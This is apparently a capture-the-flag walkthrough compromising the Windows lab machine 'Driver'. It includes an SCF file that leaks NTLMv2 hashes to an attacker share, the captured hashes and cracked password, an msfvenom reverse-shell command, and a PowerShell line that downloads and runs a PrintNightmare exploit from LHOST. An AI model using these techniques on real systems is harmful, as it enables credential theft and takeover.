First as usual, `nmap`

```
# Nmap 7.92 scan initiated Sat Oct  9 12:38:21 2021 as: nmap -vvv -p 80,135,445,5985 -sCV -oA init 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up, received syn-ack (0.062s latency).
Scanned at 2021-10-09 12:38:28 +07 for 46s

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-09T12:36:45
|_  start_date: 2021-10-09T00:41:27
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29728/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 28263/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h58m08s, deviation: 0s, median: 6h58m08s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  9 12:39:14 2021 -- 1 IP address (1 host up) scanned in 53.81 seconds
```

Visiting the web server on port 80, we're met with a prompt for credentials which we don't have yet so we run `gobuster` on it while enumerating other things.

```sh
$ gobuster dir -u "http://10.10.11.106/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt -r
/index.php            (Status: 401) [Size: 20]
/images               (Status: 403) [Size: 1233]
```

We have SMB, so I tried using null authentication which didn't work.

```sh
$ smbclient -N -L //10.10.11.106/
Can't load /etc/samba/smb.conf - run testparm to debug it
session setup failed: NT_STATUS_ACCESS_DENIED
```

Going back to the website, `index.php` requires credential, and `/images` returns 403. By guessing, we can find the credentials `admin:admin` to work, so we now have access to things on the web site.

Looking around at the page, we have nothing but the "Firmware Updates" page `fw_up.php`. Looking at that page, we seem to be able to upload files. Looking up "smb share file upload exploit", I found [this article](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) demonstrating a hash theft as well as getting meterpreter shells. Of coursed, I first tried getting a meterpreter shell by generating a payload with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=5555 -f exe > shell.exe`, setting up a listener in `msfconsole`, and uploading the payload. However, I was unable to get a shell so I went back and tried to get hashes using a malicious SCF file. The SCF file named "@pwn.scf" contains the following.

```
[Shell]
Command=2
IconFile=\\LHOST\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

I also ran `unix2dos` on the payload just in case. I then setup `responder` ...

```sh
$ sudo responder -wrf --lm -v -I tun0
```

... and uploaded the payload. Immediately after uploading, `responder` gets several hashes.

```
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c987a29e06a21289:608B9876951351BC104FEFDD1C9479DD:01010000000000001806923314BDD701AE9BF3FD778C9FEA00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:dc5a110a992b32d5:A49886A6E93208F48E779682A0789D96:0101000000000000317AC63314BDD70165B77232F5B6820E00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:f21fb64bbed31d34:32FB85A6EF8A2309EBC54CEB260A5AD9:01010000000000008834F63314BDD7013A109E83CBF40DBF00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:ca1a880e875ac715:71880F6982C75DB24016EF41C0E98469:0101000000000000D4D9253414BDD7018C88F468CA37AD8400000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:16a43fe20d06e3ee:7299ED3DFC8C250808F20CC32C0561D5:0101000000000000524B5A3414BDD70100E1496233DD5F0D00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:fcc5a8b2e128f970:7D45509EB8359CA0D15C920B5F7BE8A0:0101000000000000B75C8C3414BDD70129114D71F05FDBAC00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:f3662385eaebe716:EEE9CE81D42186BCB0B772203FFD2D53:0101000000000000460CBC3414BDD70122DC0E91E6954CB500000000020000000000000000000000
```

We should be able to crack the hashes and get the password `liltony`. We can the use the credentials to log into WinRM.

```sh
$ evil-winrm -i 10.10.11.106 -u tony -p liltony
```

Since the web site had a printer on the front page and the page `/fw_up.php` was for uploading firmware for printers, I looked up "windows printer exploit" and found the recent PrintNightmare vulnerability: CVE-2021-1675. I used [this exploit](https://github.com/calebstewart/CVE-2021-1675). Due to execution policy, however, we can't just download and run `Import-Module .\cve-2021-1675.ps1`. To get pass that, I used the following.

```powershell
iex ((new-object net.webclient).DownloadString('http://LHOST:LPORT/CVE-2021-1675.ps1'))
```

We can then run `Invoke-Nightmare` and create an administrator on the machine. We can then log into the new user and act as an administrator on the machine, rooting it.
